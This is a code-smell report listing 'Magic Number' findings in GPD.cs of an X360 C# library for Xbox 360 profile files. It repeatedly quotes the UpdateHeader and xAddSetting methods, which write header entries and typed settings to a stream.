Magic Number,X360.Profile,GPD,C:\repos\mtolly_X360\X360\X360\Profile\GPD.cs,UpdateHeader,The following statement contains a magic number: try {  	List<XDBFEntry> xEntries = GetEntries (EraseMode);  	xIO.Position = 8;  	xIO.Write (xEntryMax);  	xEntryCurrent = xEntries.Count;  	xIO.Write (xEntries.Count);  	xIO.Write (xFreeMax);  	xFreeCurrent = xFreeEnts.Count + 1;  	xIO.Write (xFreeCurrent);  	foreach (XDBFEntry x in xEntries) {  		xIO.Write ((ushort)x.NS);  		xIO.Write (x.ID);  		xIO.Write (x.xOffset);  		xIO.Write (x.Size);  	}  	xIO.Write (new byte[0x12 * (xEntryMax - xEntries.Count)]);  	foreach (FreeSpaceEntry x in xFreeEnts) {  		if (x.Size != 0) {  			xIO.Write (x.offset);  			xIO.Write (x.Size);  		}  	}  	int xdatasize = (int)(xIO.Length - HeaderSize);  	xIO.Write (xdatasize);  	xIO.Write ((int)(((-1) - xdatasize)));  	xIO.Write (new byte[0x8 * (xFreeMax - (xFreeEnts.Count + 1))]);  	xIO.Flush ();  	return true;  }  catch {  	return false;  }  
Magic Number,X360.Profile,GPD,C:\repos\mtolly_X360\X360\X360\Profile\GPD.cs,UpdateHeader,The following statement contains a magic number: xIO.Position = 8;  
Magic Number,X360.Profile,GPD,C:\repos\mtolly_X360\X360\X360\Profile\GPD.cs,xAddSetting,The following statement contains a magic number: try {  	int idx = ContainsSetting (ID);  	if (idx != -1 && !AutomaticOverwrite)  		return false;  	int xSize = 0x18;  	long pos = 0;  	SettingType xType = SettingType.Null;  	for (int i = 0; i < 2; i++) {  		switch (Data.GetType ().ToString ().ToLower ()) {  		case "system.single":  			{  				if (i == 0)  					xType = SettingType.Float;  				else {  					xIO.Write ((float)Data);  					xIO.Write ((int)0);  				}  			}  			break;  		case "system.double":  			{  				if (i == 0)  					xType = SettingType.Double;  				else  					xIO.Write ((double)Data);  			}  			break;  		case "system.int32":  			{  				if (i == 0)  					xType = SettingType.UInt32;  				else {  					xIO.Write ((int)Data);  					xIO.Write ((int)0);  				}  			}  			break;  		case "system.uint32":  			{  				if (i == 0)  					xType = SettingType.UInt32;  				else {  					xIO.Write ((uint)Data);  					xIO.Write ((uint)0);  				}  			}  			break;  		case "system.int64":  			{  				if (i == 0)  					xType = SettingType.Int64;  				else  					xIO.Write ((long)Data);  			}  			break;  		case "system.datetime":  			{  				if (i == 0)  					xType = SettingType.DateTime;  				else  					xIO.Write (((DateTime)Data).ToFileTime ());  			}  			break;  		case "system.byte[]":  			{  				if (i == 0) {  					xType = SettingType.Binary;  					byte[] xIn = (byte[])Data;  					xSize += xIn.Length;  				}  				else {  					byte[] xIn = (byte[])Data;  					xIO.Write (xIn.Length);  					xIO.Write (new byte[4]);  					xIO.Write (xIn);  				}  			}  			break;  		case "system.string":  			{  				if (i == 0) {  					xType = SettingType.Unicode;  					string xIn = (string)Data;  					xSize += ((xIn.Length + 1) * 2);  				}  				else {  					string xIn = (string)Data;  					xIO.Write ((xIn.Length + 1) * 2);  					xIO.Write (new byte[4]);  					xIO.Write (xIn' StringForm.Unicode);  					xIO.Write ((short)0);  				}  			}  			break;  		default:  			return (xActive = false);  		}  		if (i == 0) {  			if (xType == SettingType.Null)  				return false;  			pos = AllocateData (xSize);  			if (pos == -1)  				return false;  			else if (idx != -1) {  				xFreeEnts.Add (new FreeSpaceEntry (xUserSettings [idx]));  				PatchFree ();  				xUserSettings.RemoveAt (idx);  			}  			xIO.Position = pos + HeaderSize;  			xIO.Write ((uint)ID);  			xIO.Write (new byte[4]);  			xIO.Write ((byte)xType);  			xIO.Write (new byte[7]);  		}  		else  			xIO.Flush ();  	}  	XDBFEntry xent = new XDBFEntry (NameSpace.Setting' ID' (int)pos' xSize' this);  	if (!xent.Valid)  		return false;  	xUserSettings.Add (new Setting (xent));  	xUserSettings [xUserSettings.Count - 1].LoadDetails ();  	if (xSync != SyncType.None)  		UpdateSync (NameSpace.Setting' ID' xSync);  	return UpdateHeader ();  }  catch {  	return false;  }  
Magic Number,X360.Profile,GPD,C:\repos\mtolly_X360\X360\X360\Profile\GPD.cs,xAddSetting,The following statement contains a magic number: try {  	int idx = ContainsSetting (ID);  	if (idx != -1 && !AutomaticOverwrite)  		return false;  	int xSize = 0x18;  	long pos = 0;  	SettingType xType = SettingType.Null;  	for (int i = 0; i < 2; i++) {  		switch (Data.GetType ().ToString ().ToLower ()) {  		case "system.single":  			{  				if (i == 0)  					xType = SettingType.Float;  				else {  					xIO.Write ((float)Data);  					xIO.Write ((int)0);  				}  			}  			break;  		case "system.double":  			{  				if (i == 0)  					xType = SettingType.Double;  				else  					xIO.Write ((double)Data);  			}  			break;  		case "system.int32":  			{  				if (i == 0)  					xType = SettingType.UInt32;  				else {  					xIO.Write ((int)Data);  					xIO.Write ((int)0);  				}  			}  			break;  		case "system.uint32":  			{  				if (i == 0)  					xType = SettingType.UInt32;  				else {  					xIO.Write ((uint)Data);  					xIO.Write ((uint)0);  				}  			}  			break;  		case "system.int64":  			{  				if (i == 0)  					xType = SettingType.Int64;  				else  					xIO.Write ((long)Data);  			}  			break;  		case "system.datetime":  			{  				if (i == 0)  					xType = SettingType.DateTime;  				else  					xIO.Write (((DateTime)Data).ToFileTime ());  			}  			break;  		case "system.byte[]":  			{  				if (i == 0) {  					xType = SettingType.Binary;  					byte[] xIn = (byte[])Data;  					xSize += xIn.Length;  				}  				else {  					byte[] xIn = (byte[])Data;  					xIO.Write (xIn.Length);  					xIO.Write (new byte[4]);  					xIO.Write (xIn);  				}  			}  			break;  		case "system.string":  			{  				if (i == 0) {  					xType = SettingType.Unicode;  					string xIn = (string)Data;  					xSize += ((xIn.Length + 1) * 2);  				}  				else {  					string xIn = (string)Data;  					xIO.Write ((xIn.Length + 1) * 2);  					xIO.Write (new byte[4]);  					xIO.Write (xIn' StringForm.Unicode);  					xIO.Write ((short)0);  				}  			}  			break;  		default:  			return (xActive = false);  		}  		if (i == 0) {  			if (xType == SettingType.Null)  				return false;  			pos = AllocateData (xSize);  			if (pos == -1)  				return false;  			else if (idx != -1) {  				xFreeEnts.Add (new FreeSpaceEntry (xUserSettings [idx]));  				PatchFree ();  				xUserSettings.RemoveAt (idx);  			}  			xIO.Position = pos + HeaderSize;  			xIO.Write ((uint)ID);  			xIO.Write (new byte[4]);  			xIO.Write ((byte)xType);  			xIO.Write (new byte[7]);  		}  		else  			xIO.Flush ();  	}  	XDBFEntry xent = new XDBFEntry (NameSpace.Setting' ID' (int)pos' xSize' this);  	if (!xent.Valid)  		return false;  	xUserSettings.Add (new Setting (xent));  	xUserSettings [xUserSettings.Count - 1].LoadDetails ();  	if (xSync != SyncType.None)  		UpdateSync (NameSpace.Setting' ID' xSync);  	return UpdateHeader ();  }  catch {  	return false;  }  
Magic Number,X360.Profile,GPD,C:\repos\mtolly_X360\X360\X360\Profile\GPD.cs,xAddSetting,The following statement contains a magic number: try {  	int idx = ContainsSetting (ID);  	if (idx != -1 && !AutomaticOverwrite)  		return false;  	int xSize = 0x18;  	long pos = 0;  	SettingType xType = SettingType.Null;  	for (int i = 0; i < 2; i++) {  		switch (Data.GetType ().ToString ().ToLower ()) {  		case "system.single":  			{  				if (i == 0)  					xType = SettingType.Float;  				else {  					xIO.Write ((float)Data);  					xIO.Write ((int)0);  				}  			}  			break;  		case "system.double":  			{  				if (i == 0)  					xType = SettingType.Double;  				else  					xIO.Write ((double)Data);  			}  			break;  		case "system.int32":  			{  				if (i == 0)  					xType = SettingType.UInt32;  				else {  					xIO.Write ((int)Data);  					xIO.Write ((int)0);  				}  			}  			break;  		case "system.uint32":  			{  				if (i == 0)  					xType = SettingType.UInt32;  				else {  					xIO.Write ((uint)Data);  					xIO.Write ((uint)0);  				}  			}  			break;  		case "system.int64":  			{  				if (i == 0)  					xType = SettingType.Int64;  				else  					xIO.Write ((long)Data);  			}  			break;  		case "system.datetime":  			{  				if (i == 0)  					xType = SettingType.DateTime;  				else  					xIO.Write (((DateTime)Data).ToFileTime ());  			}  			break;  		case "system.byte[]":  			{  				if (i == 0) {  					xType = SettingType.Binary;  					byte[] xIn = (byte[])Data;  					xSize += xIn.Length;  				}  				else {  					byte[] xIn = (byte[])Data;  					xIO.Write (xIn.Length);  					xIO.Write (new byte[4]);  					xIO.Write (xIn);  				}  			}  			break;  		case "system.string":  			{  				if (i == 0) {  					xType = SettingType.Unicode;  					string xIn = (string)Data;  					xSize += ((xIn.Length + 1) * 2);  				}  				else {  					string xIn = (string)Data;  					xIO.Write ((xIn.Length + 1) * 2);  					xIO.Write (new byte[4]);  					xIO.Write (xIn' StringForm.Unicode);  					xIO.Write ((short)0);  				}  			}  			break;  		default:  			return (xActive = false);  		}  		if (i == 0) {  			if (xType == SettingType.Null)  				return false;  			pos = AllocateData (xSize);  			if (pos == -1)  				return false;  			else if (idx != -1) {  				xFreeEnts.Add (new FreeSpaceEntry (xUserSettings [idx]));  				PatchFree ();  				xUserSettings.RemoveAt (idx);  			}  			xIO.Position = pos + HeaderSize;  			xIO.Write ((uint)ID);  			xIO.Write (new byte[4]);  			xIO.Write ((byte)xType);  			xIO.Write (new byte[7]);  		}  		else  			xIO.Flush ();  	}  	XDBFEntry xent = new XDBFEntry (NameSpace.Setting' ID' (int)pos' xSize' this);  	if (!xent.Valid)  		return false;  	xUserSettings.Add (new Setting (xent));  	xUserSettings [xUserSettings.Count - 1].LoadDetails ();  	if (xSync != SyncType.None)  		UpdateSync (NameSpace.Setting' ID' xSync);  	return UpdateHeader ();  }  catch {  	return false;  }  
Magic Number,X360.Profile,GPD,C:\repos\mtolly_X360\X360\X360\Profile\GPD.cs,xAddSetting,The following statement contains a magic number: try {  	int idx = ContainsSetting (ID);  	if (idx != -1 && !AutomaticOverwrite)  		return false;  	int xSize = 0x18;  	long pos = 0;  	SettingType xType = SettingType.Null;  	for (int i = 0; i < 2; i++) {  		switch (Data.GetType ().ToString ().ToLower ()) {  		case "system.single":  			{  				if (i == 0)  					xType = SettingType.Float;  				else {  					xIO.Write ((float)Data);  					xIO.Write ((int)0);  				}  			}  			break;  		case "system.double":  			{  				if (i == 0)  					xType = SettingType.Double;  				else  					xIO.Write ((double)Data);  			}  			break;  		case "system.int32":  			{  				if (i == 0)  					xType = SettingType.UInt32;  				else {  					xIO.Write ((int)Data);  					xIO.Write ((int)0);  				}  			}  			break;  		case "system.uint32":  			{  				if (i == 0)  					xType = SettingType.UInt32;  				else {  					xIO.Write ((uint)Data);  					xIO.Write ((uint)0);  				}  			}  			break;  		case "system.int64":  			{  				if (i == 0)  					xType = SettingType.Int64;  				else  					xIO.Write ((long)Data);  			}  			break;  		case "system.datetime":  			{  				if (i == 0)  					xType = SettingType.DateTime;  				else  					xIO.Write (((DateTime)Data).ToFileTime ());  			}  			break;  		case "system.byte[]":  			{  				if (i == 0) {  					xType = SettingType.Binary;  					byte[] xIn = (byte[])Data;  					xSize += xIn.Length;  				}  				else {  					byte[] xIn = (byte[])Data;  					xIO.Write (xIn.Length);  					xIO.Write (new byte[4]);  					xIO.Write (xIn);  				}  			}  			break;  		case "system.string":  			{  				if (i == 0) {  					xType = SettingType.Unicode;  					string xIn = (string)Data;  					xSize += ((xIn.Length + 1) * 2);  				}  				else {  					string xIn = (string)Data;  					xIO.Write ((xIn.Length + 1) * 2);  					xIO.Write (new byte[4]);  					xIO.Write (xIn' StringForm.Unicode);  					xIO.Write ((short)0);  				}  			}  			break;  		default:  			return (xActive = false);  		}  		if (i == 0) {  			if (xType == SettingType.Null)  				return false;  			pos = AllocateData (xSize);  			if (pos == -1)  				return false;  			else if (idx != -1) {  				xFreeEnts.Add (new FreeSpaceEntry (xUserSettings [idx]));  				PatchFree ();  				xUserSettings.RemoveAt (idx);  			}  			xIO.Position = pos + HeaderSize;  			xIO.Write ((uint)ID);  			xIO.Write (new byte[4]);  			xIO.Write ((byte)xType);  			xIO.Write (new byte[7]);  		}  		else  			xIO.Flush ();  	}  	XDBFEntry xent = new XDBFEntry (NameSpace.Setting' ID' (int)pos' xSize' this);  	if (!xent.Valid)  		return false;  	xUserSettings.Add (new Setting (xent));  	xUserSettings [xUserSettings.Count - 1].LoadDetails ();  	if (xSync != SyncType.None)  		UpdateSync (NameSpace.Setting' ID' xSync);  	return UpdateHeader ();  }  catch {  	return false;  }  
Magic Number,X360.Profile,GPD,C:\repos\mtolly_X360\X360\X360\Profile\GPD.cs,xAddSetting,The following statement contains a magic number: try {  	int idx = ContainsSetting (ID);  	if (idx != -1 && !AutomaticOverwrite)  		return false;  	int xSize = 0x18;  	long pos = 0;  	SettingType xType = SettingType.Null;  	for (int i = 0; i < 2; i++) {  		switch (Data.GetType ().ToString ().ToLower ()) {  		case "system.single":  			{  				if (i == 0)  					xType = SettingType.Float;  				else {  					xIO.Write ((float)Data);  					xIO.Write ((int)0);  				}  			}  			break;  		case "system.double":  			{  				if (i == 0)  					xType = SettingType.Double;  				else  					xIO.Write ((double)Data);  			}  			break;  		case "system.int32":  			{  				if (i == 0)  					xType = SettingType.UInt32;  				else {  					xIO.Write ((int)Data);  					xIO.Write ((int)0);  				}  			}  			break;  		case "system.uint32":  			{  				if (i == 0)  					xType = SettingType.UInt32;  				else {  					xIO.Write ((uint)Data);  					xIO.Write ((uint)0);  				}  			}  			break;  		case "system.int64":  			{  				if (i == 0)  					xType = SettingType.Int64;  				else  					xIO.Write ((long)Data);  			}  			break;  		case "system.datetime":  			{  				if (i == 0)  					xType = SettingType.DateTime;  				else  					xIO.Write (((DateTime)Data).ToFileTime ());  			}  			break;  		case "system.byte[]":  			{  				if (i == 0) {  					xType = SettingType.Binary;  					byte[] xIn = (byte[])Data;  					xSize += xIn.Length;  				}  				else {  					byte[] xIn = (byte[])Data;  					xIO.Write (xIn.Length);  					xIO.Write (new byte[4]);  					xIO.Write (xIn);  				}  			}  			break;  		case "system.string":  			{  				if (i == 0) {  					xType = SettingType.Unicode;  					string xIn = (string)Data;  					xSize += ((xIn.Length + 1) * 2);  				}  				else {  					string xIn = (string)Data;  					xIO.Write ((xIn.Length + 1) * 2);  					xIO.Write (new byte[4]);  					xIO.Write (xIn' StringForm.Unicode);  					xIO.Write ((short)0);  				}  			}  			break;  		default:  			return (xActive = false);  		}  		if (i == 0) {  			if (xType == SettingType.Null)  				return false;  			pos = AllocateData (xSize);  			if (pos == -1)  				return false;  			else if (idx != -1) {  				xFreeEnts.Add (new FreeSpaceEntry (xUserSettings [idx]));  				PatchFree ();  				xUserSettings.RemoveAt (idx);  			}  			xIO.Position = pos + HeaderSize;  			xIO.Write ((uint)ID);  			xIO.Write (new byte[4]);  			xIO.Write ((byte)xType);  			xIO.Write (new byte[7]);  		}  		else  			xIO.Flush ();  	}  	XDBFEntry xent = new XDBFEntry (NameSpace.Setting' ID' (int)pos' xSize' this);  	if (!xent.Valid)  		return false;  	xUserSettings.Add (new Setting (xent));  	xUserSettings [xUserSettings.Count - 1].LoadDetails ();  	if (xSync != SyncType.None)  		UpdateSync (NameSpace.Setting' ID' xSync);  	return UpdateHeader ();  }  catch {  	return false;  }  
Magic Number,X360.Profile,GPD,C:\repos\mtolly_X360\X360\X360\Profile\GPD.cs,xAddSetting,The following statement contains a magic number: try {  	int idx = ContainsSetting (ID);  	if (idx != -1 && !AutomaticOverwrite)  		return false;  	int xSize = 0x18;  	long pos = 0;  	SettingType xType = SettingType.Null;  	for (int i = 0; i < 2; i++) {  		switch (Data.GetType ().ToString ().ToLower ()) {  		case "system.single":  			{  				if (i == 0)  					xType = SettingType.Float;  				else {  					xIO.Write ((float)Data);  					xIO.Write ((int)0);  				}  			}  			break;  		case "system.double":  			{  				if (i == 0)  					xType = SettingType.Double;  				else  					xIO.Write ((double)Data);  			}  			break;  		case "system.int32":  			{  				if (i == 0)  					xType = SettingType.UInt32;  				else {  					xIO.Write ((int)Data);  					xIO.Write ((int)0);  				}  			}  			break;  		case "system.uint32":  			{  				if (i == 0)  					xType = SettingType.UInt32;  				else {  					xIO.Write ((uint)Data);  					xIO.Write ((uint)0);  				}  			}  			break;  		case "system.int64":  			{  				if (i == 0)  					xType = SettingType.Int64;  				else  					xIO.Write ((long)Data);  			}  			break;  		case "system.datetime":  			{  				if (i == 0)  					xType = SettingType.DateTime;  				else  					xIO.Write (((DateTime)Data).ToFileTime ());  			}  			break;  		case "system.byte[]":  			{  				if (i == 0) {  					xType = SettingType.Binary;  					byte[] xIn = (byte[])Data;  					xSize += xIn.Length;  				}  				else {  					byte[] xIn = (byte[])Data;  					xIO.Write (xIn.Length);  					xIO.Write (new byte[4]);  					xIO.Write (xIn);  				}  			}  			break;  		case "system.string":  			{  				if (i == 0) {  					xType = SettingType.Unicode;  					string xIn = (string)Data;  					xSize += ((xIn.Length + 1) * 2);  				}  				else {  					string xIn = (string)Data;  					xIO.Write ((xIn.Length + 1) * 2);  					xIO.Write (new byte[4]);  					xIO.Write (xIn' StringForm.Unicode);  					xIO.Write ((short)0);  				}  			}  			break;  		default:  			return (xActive = false);  		}  		if (i == 0) {  			if (xType == SettingType.Null)  				return false;  			pos = AllocateData (xSize);  			if (pos == -1)  				return false;  			else if (idx != -1) {  				xFreeEnts.Add (new FreeSpaceEntry (xUserSettings [idx]));  				PatchFree ();  				xUserSettings.RemoveAt (idx);  			}  			xIO.Position = pos + HeaderSize;  			xIO.Write ((uint)ID);  			xIO.Write (new byte[4]);  			xIO.Write ((byte)xType);  			xIO.Write (new byte[7]);  		}  		else  			xIO.Flush ();  	}  	XDBFEntry xent = new XDBFEntry (NameSpace.Setting' ID' (int)pos' xSize' this);  	if (!xent.Valid)  		return false;  	xUserSettings.Add (new Setting (xent));  	xUserSettings [xUserSettings.Count - 1].LoadDetails ();  	if (xSync != SyncType.None)  		UpdateSync (NameSpace.Setting' ID' xSync);  	return UpdateHeader ();  }  catch {  	return false;  }  
Magic Number,X360.Profile,GPD,C:\repos\mtolly_X360\X360\X360\Profile\GPD.cs,xAddSetting,The following statement contains a magic number: try {  	int idx = ContainsSetting (ID);  	if (idx != -1 && !AutomaticOverwrite)  		return false;  	int xSize = 0x18;  	long pos = 0;  	SettingType xType = SettingType.Null;  	for (int i = 0; i < 2; i++) {  		switch (Data.GetType ().ToString ().ToLower ()) {  		case "system.single":  			{  				if (i == 0)  					xType = SettingType.Float;  				else {  					xIO.Write ((float)Data);  					xIO.Write ((int)0);  				}  			}  			break;  		case "system.double":  			{  				if (i == 0)  					xType = SettingType.Double;  				else  					xIO.Write ((double)Data);  			}  			break;  		case "system.int32":  			{  				if (i == 0)  					xType = SettingType.UInt32;  				else {  					xIO.Write ((int)Data);  					xIO.Write ((int)0);  				}  			}  			break;  		case "system.uint32":  			{  				if (i == 0)  					xType = SettingType.UInt32;  				else {  					xIO.Write ((uint)Data);  					xIO.Write ((uint)0);  				}  			}  			break;  		case "system.int64":  			{  				if (i == 0)  					xType = SettingType.Int64;  				else  					xIO.Write ((long)Data);  			}  			break;  		case "system.datetime":  			{  				if (i == 0)  					xType = SettingType.DateTime;  				else  					xIO.Write (((DateTime)Data).ToFileTime ());  			}  			break;  		case "system.byte[]":  			{  				if (i == 0) {  					xType = SettingType.Binary;  					byte[] xIn = (byte[])Data;  					xSize += xIn.Length;  				}  				else {  					byte[] xIn = (byte[])Data;  					xIO.Write (xIn.Length);  					xIO.Write (new byte[4]);  					xIO.Write (xIn);  				}  			}  			break;  		case "system.string":  			{  				if (i == 0) {  					xType = SettingType.Unicode;  					string xIn = (string)Data;  					xSize += ((xIn.Length + 1) * 2);  				}  				else {  					string xIn = (string)Data;  					xIO.Write ((xIn.Length + 1) * 2);  					xIO.Write (new byte[4]);  					xIO.Write (xIn' StringForm.Unicode);  					xIO.Write ((short)0);  				}  			}  			break;  		default:  			return (xActive = false);  		}  		if (i == 0) {  			if (xType == SettingType.Null)  				return false;  			pos = AllocateData (xSize);  			if (pos == -1)  				return false;  			else if (idx != -1) {  				xFreeEnts.Add (new FreeSpaceEntry (xUserSettings [idx]));  				PatchFree ();  				xUserSettings.RemoveAt (idx);  			}  			xIO.Position = pos + HeaderSize;  			xIO.Write ((uint)ID);  			xIO.Write (new byte[4]);  			xIO.Write ((byte)xType);  			xIO.Write (new byte[7]);  		}  		else  			xIO.Flush ();  	}  	XDBFEntry xent = new XDBFEntry (NameSpace.Setting' ID' (int)pos' xSize' this);  	if (!xent.Valid)  		return false;  	xUserSettings.Add (new Setting (xent));  	xUserSettings [xUserSettings.Count - 1].LoadDetails ();  	if (xSync != SyncType.None)  		UpdateSync (NameSpace.Setting' ID' xSync);  	return UpdateHeader ();  }  catch {  	return false;  }  
Magic Number,X360.Profile,GPD,C:\repos\mtolly_X360\X360\X360\Profile\GPD.cs,xAddSetting,The following statement contains a magic number: for (int i = 0; i < 2; i++) {  	switch (Data.GetType ().ToString ().ToLower ()) {  	case "system.single":  		{  			if (i == 0)  				xType = SettingType.Float;  			else {  				xIO.Write ((float)Data);  				xIO.Write ((int)0);  			}  		}  		break;  	case "system.double":  		{  			if (i == 0)  				xType = SettingType.Double;  			else  				xIO.Write ((double)Data);  		}  		break;  	case "system.int32":  		{  			if (i == 0)  				xType = SettingType.UInt32;  			else {  				xIO.Write ((int)Data);  				xIO.Write ((int)0);  			}  		}  		break;  	case "system.uint32":  		{  			if (i == 0)  				xType = SettingType.UInt32;  			else {  				xIO.Write ((uint)Data);  				xIO.Write ((uint)0);  			}  		}  		break;  	case "system.int64":  		{  			if (i == 0)  				xType = SettingType.Int64;  			else  				xIO.Write ((long)Data);  		}  		break;  	case "system.datetime":  		{  			if (i == 0)  				xType = SettingType.DateTime;  			else  				xIO.Write (((DateTime)Data).ToFileTime ());  		}  		break;  	case "system.byte[]":  		{  			if (i == 0) {  				xType = SettingType.Binary;  				byte[] xIn = (byte[])Data;  				xSize += xIn.Length;  			}  			else {  				byte[] xIn = (byte[])Data;  				xIO.Write (xIn.Length);  				xIO.Write (new byte[4]);  				xIO.Write (xIn);  			}  		}  		break;  	case "system.string":  		{  			if (i == 0) {  				xType = SettingType.Unicode;  				string xIn = (string)Data;  				xSize += ((xIn.Length + 1) * 2);  			}  			else {  				string xIn = (string)Data;  				xIO.Write ((xIn.Length + 1) * 2);  				xIO.Write (new byte[4]);  				xIO.Write (xIn' StringForm.Unicode);  				xIO.Write ((short)0);  			}  		}  		break;  	default:  		return (xActive = false);  	}  	if (i == 0) {  		if (xType == SettingType.Null)  			return false;  		pos = AllocateData (xSize);  		if (pos == -1)  			return false;  		else if (idx != -1) {  			xFreeEnts.Add (new FreeSpaceEntry (xUserSettings [idx]));  			PatchFree ();  			xUserSettings.RemoveAt (idx);  		}  		xIO.Position = pos + HeaderSize;  		xIO.Write ((uint)ID);  		xIO.Write (new byte[4]);  		xIO.Write ((byte)xType);  		xIO.Write (new byte[7]);  	}  	else  		xIO.Flush ();  }  
Magic Number,X360.Profile,GPD,C:\repos\mtolly_X360\X360\X360\Profile\GPD.cs,xAddSetting,The following statement contains a magic number: for (int i = 0; i < 2; i++) {  	switch (Data.GetType ().ToString ().ToLower ()) {  	case "system.single":  		{  			if (i == 0)  				xType = SettingType.Float;  			else {  				xIO.Write ((float)Data);  				xIO.Write ((int)0);  			}  		}  		break;  	case "system.double":  		{  			if (i == 0)  				xType = SettingType.Double;  			else  				xIO.Write ((double)Data);  		}  		break;  	case "system.int32":  		{  			if (i == 0)  				xType = SettingType.UInt32;  			else {  				xIO.Write ((int)Data);  				xIO.Write ((int)0);  			}  		}  		break;  	case "system.uint32":  		{  			if (i == 0)  				xType = SettingType.UInt32;  			else {  				xIO.Write ((uint)Data);  				xIO.Write ((uint)0);  			}  		}  		break;  	case "system.int64":  		{  			if (i == 0)  				xType = SettingType.Int64;  			else  				xIO.Write ((long)Data);  		}  		break;  	case "system.datetime":  		{  			if (i == 0)  				xType = SettingType.DateTime;  			else  				xIO.Write (((DateTime)Data).ToFileTime ());  		}  		break;  	case "system.byte[]":  		{  			if (i == 0) {  				xType = SettingType.Binary;  				byte[] xIn = (byte[])Data;  				xSize += xIn.Length;  			}  			else {  				byte[] xIn = (byte[])Data;  				xIO.Write (xIn.Length);  				xIO.Write (new byte[4]);  				xIO.Write (xIn);  			}  		}  		break;  	case "system.string":  		{  			if (i == 0) {  				xType = SettingType.Unicode;  				string xIn = (string)Data;  				xSize += ((xIn.Length + 1) * 2);  			}  			else {  				string xIn = (string)Data;  				xIO.Write ((xIn.Length + 1) * 2);  				xIO.Write (new byte[4]);  				xIO.Write (xIn' StringForm.Unicode);  				xIO.Write ((short)0);  			}  		}  		break;  	default:  		return (xActive = false);  	}  	if (i == 0) {  		if (xType == SettingType.Null)  			return false;  		pos = AllocateData (xSize);  		if (pos == -1)  			return false;  		else if (idx != -1) {  			xFreeEnts.Add (new FreeSpaceEntry (xUserSettings [idx]));  			PatchFree ();  			xUserSettings.RemoveAt (idx);  		}  		xIO.Position = pos + HeaderSize;  		xIO.Write ((uint)ID);  		xIO.Write (new byte[4]);  		xIO.Write ((byte)xType);  		xIO.Write (new byte[7]);  	}  	else  		xIO.Flush ();  }  
Magic Number,X360.Profile,GPD,C:\repos\mtolly_X360\X360\X360\Profile\GPD.cs,xAddSetting,The following statement contains a magic number: for (int i = 0; i < 2; i++) {  	switch (Data.GetType ().ToString ().ToLower ()) {  	case "system.single":  		{  			if (i == 0)  				xType = SettingType.Float;  			else {  				xIO.Write ((float)Data);  				xIO.Write ((int)0);  			}  		}  		break;  	case "system.double":  		{  			if (i == 0)  				xType = SettingType.Double;  			else  				xIO.Write ((double)Data);  		}  		break;  	case "system.int32":  		{  			if (i == 0)  				xType = SettingType.UInt32;  			else {  				xIO.Write ((int)Data);  				xIO.Write ((int)0);  			}  		}  		break;  	case "system.uint32":  		{  			if (i == 0)  				xType = SettingType.UInt32;  			else {  				xIO.Write ((uint)Data);  				xIO.Write ((uint)0);  			}  		}  		break;  	case "system.int64":  		{  			if (i == 0)  				xType = SettingType.Int64;  			else  				xIO.Write ((long)Data);  		}  		break;  	case "system.datetime":  		{  			if (i == 0)  				xType = SettingType.DateTime;  			else  				xIO.Write (((DateTime)Data).ToFileTime ());  		}  		break;  	case "system.byte[]":  		{  			if (i == 0) {  				xType = SettingType.Binary;  				byte[] xIn = (byte[])Data;  				xSize += xIn.Length;  			}  			else {  				byte[] xIn = (byte[])Data;  				xIO.Write (xIn.Length);  				xIO.Write (new byte[4]);  				xIO.Write (xIn);  			}  		}  		break;  	case "system.string":  		{  			if (i == 0) {  				xType = SettingType.Unicode;  				string xIn = (string)Data;  				xSize += ((xIn.Length + 1) * 2);  			}  			else {  				string xIn = (string)Data;  				xIO.Write ((xIn.Length + 1) * 2);  				xIO.Write (new byte[4]);  				xIO.Write (xIn' StringForm.Unicode);  				xIO.Write ((short)0);  			}  		}  		break;  	default:  		return (xActive = false);  	}  	if (i == 0) {  		if (xType == SettingType.Null)  			return false;  		pos = AllocateData (xSize);  		if (pos == -1)  			return false;  		else if (idx != -1) {  			xFreeEnts.Add (new FreeSpaceEntry (xUserSettings [idx]));  			PatchFree ();  			xUserSettings.RemoveAt (idx);  		}  		xIO.Position = pos + HeaderSize;  		xIO.Write ((uint)ID);  		xIO.Write (new byte[4]);  		xIO.Write ((byte)xType);  		xIO.Write (new byte[7]);  	}  	else  		xIO.Flush ();  }  
Magic Number,X360.Profile,GPD,C:\repos\mtolly_X360\X360\X360\Profile\GPD.cs,xAddSetting,The following statement contains a magic number: for (int i = 0; i < 2; i++) {  	switch (Data.GetType ().ToString ().ToLower ()) {  	case "system.single":  		{  			if (i == 0)  				xType = SettingType.Float;  			else {  				xIO.Write ((float)Data);  				xIO.Write ((int)0);  			}  		}  		break;  	case "system.double":  		{  			if (i == 0)  				xType = SettingType.Double;  			else  				xIO.Write ((double)Data);  		}  		break;  	case "system.int32":  		{  			if (i == 0)  				xType = SettingType.UInt32;  			else {  				xIO.Write ((int)Data);  				xIO.Write ((int)0);  			}  		}  		break;  	case "system.uint32":  		{  			if (i == 0)  				xType = SettingType.UInt32;  			else {  				xIO.Write ((uint)Data);  				xIO.Write ((uint)0);  			}  		}  		break;  	case "system.int64":  		{  			if (i == 0)  				xType = SettingType.Int64;  			else  				xIO.Write ((long)Data);  		}  		break;  	case "system.datetime":  		{  			if (i == 0)  				xType = SettingType.DateTime;  			else  				xIO.Write (((DateTime)Data).ToFileTime ());  		}  		break;  	case "system.byte[]":  		{  			if (i == 0) {  				xType = SettingType.Binary;  				byte[] xIn = (byte[])Data;  				xSize += xIn.Length;  			}  			else {  				byte[] xIn = (byte[])Data;  				xIO.Write (xIn.Length);  				xIO.Write (new byte[4]);  				xIO.Write (xIn);  			}  		}  		break;  	case "system.string":  		{  			if (i == 0) {  				xType = SettingType.Unicode;  				string xIn = (string)Data;  				xSize += ((xIn.Length + 1) * 2);  			}  			else {  				string xIn = (string)Data;  				xIO.Write ((xIn.Length + 1) * 2);  				xIO.Write (new byte[4]);  				xIO.Write (xIn' StringForm.Unicode);  				xIO.Write ((short)0);  			}  		}  		break;  	default:  		return (xActive = false);  	}  	if (i == 0) {  		if (xType == SettingType.Null)  			return false;  		pos = AllocateData (xSize);  		if (pos == -1)  			return false;  		else if (idx != -1) {  			xFreeEnts.Add (new FreeSpaceEntry (xUserSettings [idx]));  			PatchFree ();  			xUserSettings.RemoveAt (idx);  		}  		xIO.Position = pos + HeaderSize;  		xIO.Write ((uint)ID);  		xIO.Write (new byte[4]);  		xIO.Write ((byte)xType);  		xIO.Write (new byte[7]);  	}  	else  		xIO.Flush ();  }  
